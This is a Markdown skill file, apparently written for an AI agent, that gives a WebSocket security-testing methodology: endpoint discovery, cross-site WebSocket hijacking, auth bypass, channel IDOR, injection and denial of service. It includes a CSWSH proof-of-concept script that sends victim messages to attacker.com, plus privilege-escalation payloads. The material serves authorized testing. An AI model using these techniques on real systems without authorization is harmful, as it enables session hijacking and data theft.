---
name: websocket
description: WebSocket and real-time protocol security testing covering handshake auth bypass, message injection, cross-site WebSocket hijacking, and subscription abuse
---

# WebSocket

WebSocket connections upgrade from HTTP but live outside the normal request-response cycle. Once established, the channel is bidirectional and long-lived — auth checks that happen only at handshake leave the entire session unprotected if the upgrade token is weak or absent. Test the upgrade, the message layer, and the teardown independently.

## Attack Surface

**Transports**
- Native WebSocket (`ws://`, `wss://`)
- Socket.IO (polling fallback + WebSocket upgrade)
- GraphQL subscriptions (`graphql-ws`, `graphql-transport-ws`)
- Server-Sent Events (SSE) — one-directional but shares auth patterns

**Endpoints**
- `/ws`, `/wss`, `/socket`, `/socket.io/`, `/cable`, `/hub`, `/realtime`
- GraphQL subscription endpoints (same URL, `Upgrade: websocket`)
- Custom paths discoverable via JS source analysis

**Frameworks**
- Node.js: `ws`, `socket.io`, `@fastify/websocket`, `express-ws`
- Python: `websockets`, Django Channels, FastAPI WebSocket
- Java: Spring WebSocket, Tyrus
- Go: `gorilla/websocket`, `nhooyr.io/websocket`
- .NET: SignalR

## Reconnaissance

### Endpoint Discovery

**HTTP Upgrade Probes**
```
GET /ws HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
```

Scan common paths: `/ws`, `/wss`, `/socket`, `/socket.io/?EIO=4&transport=websocket`, `/graphql`, `/cable`, `/hub`, `/realtime`, `/live`, `/stream`.

**JavaScript Source Analysis**
- Search client bundles for `new WebSocket(`, `io(`, `io.connect(`, `createClient(`
- Extract hardcoded URLs, paths, and protocol subprotocol strings
- Identify message schemas from `socket.on(` / `socket.emit(` handlers

**Protocol Identification**
- Socket.IO: initial HTTP polling handshake, then upgrade; look for `EIO=` and `sid=` params
- GraphQL subscriptions: `Sec-WebSocket-Protocol: graphql-transport-ws`
- ActionCable: `Sec-WebSocket-Protocol: actioncable-v1-json`

## Key Vulnerabilities

### Cross-Site WebSocket Hijacking (CSWSH)

The most critical WebSocket-specific vulnerability. If the server relies solely on cookies for auth and does not validate `Origin`, an attacker page can open a WebSocket to the target and read/write messages using the victim's session.

**Test**
```html
<script>
  const ws = new WebSocket('wss://target.com/ws');
  ws.onopen = () => ws.send(JSON.stringify({action: 'get_profile'}));
  ws.onmessage = (e) => fetch('https://attacker.com/log?d=' + btoa(e.data));
</script>
```

**Check**
1. Does the server validate `Origin` header on upgrade?
2. Does the server require a non-cookie token (e.g., ticket in URL or first message)?
3. Is `SameSite` cookie attribute set?

**Bypass attempts**
- Null origin (`Origin: null` via data: URI or sandboxed iframe)
- Subdomain origins if wildcard or parent-domain matching
- Case variations and trailing-dot domains

### Handshake Authentication Bypass

**Missing Auth on Upgrade**
- Server authenticates HTTP routes but WebSocket upgrade handler has no auth middleware
- Test: connect without any session cookie or token — does the server accept?

**Token Leakage**
- Auth tokens in WebSocket URL query params (`wss://target.com/ws?token=SECRET`) leak via Referer, server logs, proxy logs, browser history
- Prefer token in first message or `Sec-WebSocket-Protocol` header

**Ticket/Session Fixation**
- If upgrade uses a ticket from an HTTP endpoint, test ticket reuse, expiry, and cross-user acceptance
- Does the ticket bind to the requesting session/IP?

### Message-Level Authorization

**Missing Per-Message Auth**
- Auth checked at handshake but not on individual messages
- Subscribe to channels or rooms belonging to other users:
```json
{"action": "subscribe", "channel": "user_notifications", "user_id": "FOREIGN_ID"}
```

**Privilege Escalation via Message**
```json
{"action": "admin_broadcast", "message": "test"}
{"action": "delete_room", "room_id": "target"}
```
- Test admin-only actions from unprivileged connections

**Channel/Room IDOR**
- Enumerate room/channel IDs: numeric sequences, UUIDs, predictable names
- Join private rooms without invitation token

### Message Injection & Manipulation

**Schema Abuse**
- Send unexpected message types or malformed JSON
- Inject extra fields: `{"msg": "hello", "role": "admin"}`
- Type confusion: string where int expected, nested objects, arrays

**Server-Side Sinks**
- Messages stored and rendered to other users (stored XSS)
- Messages passed to database queries (SQLi/NoSQLi)
- Messages triggering server-side operations (SSRF, command injection)
- Template rendering of message content (SSTI)

**Protocol-Level**
- Fragmented frames to bypass message inspection
- Control frames (ping/pong/close) with oversized or malicious payloads
- Binary frames when text expected and vice versa
- Reserved opcodes and extension negotiation abuse

### Denial of Service

**Connection Exhaustion**
- Open maximum connections without sending data
- Slowloris-style: keep connections alive with periodic pings

**Message Flooding**
- Rapid message sends to exhaust server resources
- Large messages exceeding expected size limits
- Deeply nested JSON payloads

**Frame Abuse**
- Fragmented messages never completed
- Ping floods forcing pong responses

### Socket.IO Specific

**Namespace Abuse**
```javascript
io('/admin')  // Connect to privileged namespace without auth
io('/internal')
```

**Event Injection**
- Emit server-only events: `socket.emit('__disconnect')`, internal lifecycle events
- Test acknowledgement callbacks with crafted return values

**Polling Fallback**
- Auth on WebSocket but not on long-polling transport
- Session fixation via `sid` parameter reuse

### GraphQL Subscription Abuse

- Subscribe to mutations on foreign objects
- Filter argument manipulation to receive unauthorized events
- Subscribe without query-level authorization
- Multiplexed subscriptions bypassing per-operation limits

## Testing Methodology

1. **Discover** — Find WebSocket endpoints via HTTP upgrade probes, JS source analysis, and proxy traffic inspection
2. **Fingerprint** — Identify framework (raw WS, Socket.IO, GraphQL, SignalR, ActionCable) and subprotocol
3. **CSWSH test** — Connect from a cross-origin page with victim cookies; check Origin validation
4. **Auth matrix** — Test upgrade with: no auth, expired token, other user's token, modified token
5. **Message auth** — Send privileged actions and foreign-user subscriptions from unprivileged connection
6. **Injection** — Fuzz message fields with XSS, SQLi, SSTI, command injection payloads
7. **Transport parity** — If Socket.IO, test same operations via polling and WebSocket transports
8. **State management** — Test reconnection handling, session persistence, and cleanup on disconnect

## Validation

1. **CSWSH** — Show cross-origin page reading authenticated data via WebSocket with only cookies; include Origin header comparison (sent vs accepted)
2. **Auth bypass** — Demonstrate unauthenticated or cross-user WebSocket access with paired requests (legitimate vs unauthorized)
3. **Message injection** — Show injected payload executing or persisting with evidence (DOM capture, database state, response content)
4. **Channel IDOR** — Subscribe to foreign channel and receive data intended for another user; show subscription request and received message
5. Provide WebSocket frame captures (request + response) for all findings

## False Positives

- Server validates Origin but test was same-origin (not actually CSWSH)
- WebSocket requires non-cookie auth token that attacker cannot obtain cross-origin
- Channel names appear guessable but server enforces membership check before delivering messages
- Admin namespace accepts connection but returns empty/error responses for all operations
- Rate limiting or connection limits prevent practical exploitation

## Impact

- Session hijacking via CSWSH (victim visits attacker page, attacker reads/writes their WS)
- Real-time data exfiltration from chat, notifications, financial feeds
- Unauthorized actions via message-level privilege escalation
- Stored XSS through injected WebSocket messages displayed to other users
- Lateral movement from WebSocket to internal services via SSRF in message handlers

## Pro Tips

1. Use browser DevTools Network → WS tab or Caido to inspect frame-level traffic
2. For Socket.IO, watch the initial polling handshake — it reveals the `sid` and server config
3. Test both `ws://` and `wss://` — some servers accept unencrypted connections on a different port
4. Check if the server sends sensitive data on connection (user profile, tokens) before any client request
5. WebSocket connections bypass CSRF protections designed for HTTP — always test cross-origin
6. Monitor for connection downgrade: if `wss://` fails, does the client fall back to `ws://` or polling?
7. Binary message formats (MessagePack, Protobuf) need deserialization before injection testing

## Summary

WebSocket security requires auth at upgrade AND per-message, Origin validation for CSWSH prevention, and input validation on every message field. The long-lived bidirectional channel means a single auth bypass grants persistent access. Test the handshake, the messages, and the transport independently.
